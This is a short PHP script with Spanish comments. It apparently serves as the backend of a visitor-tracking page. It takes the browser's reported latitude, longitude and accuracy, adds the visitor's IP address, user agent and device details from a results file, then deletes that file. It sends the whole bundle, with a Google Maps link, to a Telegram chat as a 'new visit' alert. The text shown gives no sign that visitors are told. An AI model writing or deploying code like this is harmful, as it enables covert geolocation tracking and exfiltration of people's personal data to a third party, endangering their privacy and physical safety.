<?php
require_once __DIR__ . '/config.php';
require_once __DIR__ . '/ip_utils.php';
require_once __DIR__ . '/telegram.php';

header('Content-Type: application/json');

$raw = file_get_contents('php://input');
$payload = json_decode($raw, true) ?: [];

$lat = $payload['latitude'] ?? null;
$lon = $payload['longitude'] ?? null;
$acc = $payload['accuracy'] ?? null;
$error = $payload['error'] ?? null;

$ip = get_client_ip();
$ua = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
$ts = gmdate('Y-m-d H:i:s');

$msg = "📍 <b>Nueva visita</b>\n";
$msg .= "🌐 IP: $ip\n";
$msg .= "🖥️ UA: $ua\n";

if ($lat && $lon) {
    $msg .= "📌 Lat: $lat\n";
    $msg .= "📌 Lon: $lon\n";
    if ($acc) $msg .= "🎯 Precisión: {$acc}m\n";
    $msg .= "🌍 Maps: https://www.google.com/maps?q=$lat,$lon\n";
} else {
    $msg .= "⚠️ Ubicación: " . ($error ?: "No disponible o denegada") . "\n";
}

$msg .= "⏰ Hora: $ts\n";

// Incluir info del dispositivo
if (file_exists(__DIR__ . '/resultados.txt')) {
    $extra = trim(file_get_contents(__DIR__ . '/resultados.txt'));
    if ($extra) $msg .= "\n<b>Dispositivo:</b>\n$extra";
    unlink(__DIR__ . '/resultados.txt');
}

// ENVIAR A TELEGRAM
send_to_telegram($msg);

echo json_encode(['status' => 'ok']);
?>
